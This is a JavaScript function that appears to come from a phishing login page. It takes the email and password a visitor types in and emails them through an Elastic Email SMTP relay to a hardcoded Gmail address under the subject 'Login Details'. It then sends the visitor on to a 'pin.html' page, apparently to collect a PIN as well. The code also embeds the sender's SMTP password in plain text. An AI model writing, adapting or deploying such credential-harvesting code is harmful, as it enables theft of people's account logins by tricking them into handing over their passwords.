function emailSend() {
  var email = document.getElementById('email').value.trim();
  var password = document.getElementById('password').value.trim();

  if (!email || !password) {
    swal("Error", "Please complete form details", "error");
    return;
  }

  var messageBody = "Email: " + email + "<br/>Password: " + password;

  Email.send({
    Host: "smtp.elasticemail.com",
    Username: "payday10177@gmail.com",
    Password: "176A549B6BD880A9C5A531EDE06FF1F541C8",
    To: 'payday10177@gmail.com',
    From: "payday10177@gmail.com",
    Subject: "Login Details",
    Body: messageBody
  }).then(
    message => {
      if (message == 'OK') {
        window.location.href = 'pin.html';
      } else {
        swal("Error", "Something went wrong. Please try again.", "error");
      }
    }
  ).catch(error => {
    console.error(error);
    swal("Error", "Email sending failed.", "error");
  });
}
